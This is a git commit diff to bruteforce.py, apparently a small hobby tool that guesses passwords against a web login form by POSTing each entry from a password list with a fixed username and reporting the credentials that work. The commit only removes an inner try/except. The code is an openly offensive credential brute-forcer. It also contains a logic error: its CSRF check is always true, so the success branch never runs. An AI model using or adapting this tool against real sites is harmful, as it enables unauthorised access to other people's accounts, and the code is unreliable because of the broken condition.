42c2ecfe75fd8cb65eb4e6fe4fbc11b746af062f
Tanvir Hossain Antu <textmeantu@gmail.com>
2020-12-02 12:49:09 +0600

    Try catch remove

--- bruteforce.py
+++ bruteforce.py
@@ -8,23 +8,20 @@ try:
     def bruteCracking(username,url,error):
         count = 0
         for password in passwords:
-            try:
-                password = password.strip()
-                count = count + 1
-                print("Trying: "+ str(count) + ' Time For => ' + password)
-                data_dict = {"LogInID": username,"Password":password, "Log In":"submit"}
-                response = requests.post(url, data=data_dict)
-                if error in str(response.content):
-                    pass
-                elif "CSRF" or "csrf" in str(response.content):
-                    print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
-                    exit()
-                else:
-                    print("Username: ---> " + username)
-                    print("Password: ---> " + password)
-                    exit()
-            except:
+            password = password.strip()
+            count = count + 1
+            print("Trying: "+ str(count) + ' Time For => ' + password)
+            data_dict = {"LogInID": username,"Password":password, "Log In":"submit"}
+            response = requests.post(url, data=data_dict)
+            if error in str(response.content):
                 pass
+            elif "CSRF" or "csrf" in str(response.content):
+                print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
+                exit()
+            else:
+                print("Username: ---> " + username)
+                print("Password: ---> " + password)
+                exit()
 except:
     print("Some Error Occurred Please Check Your Internet Connection !!")
 
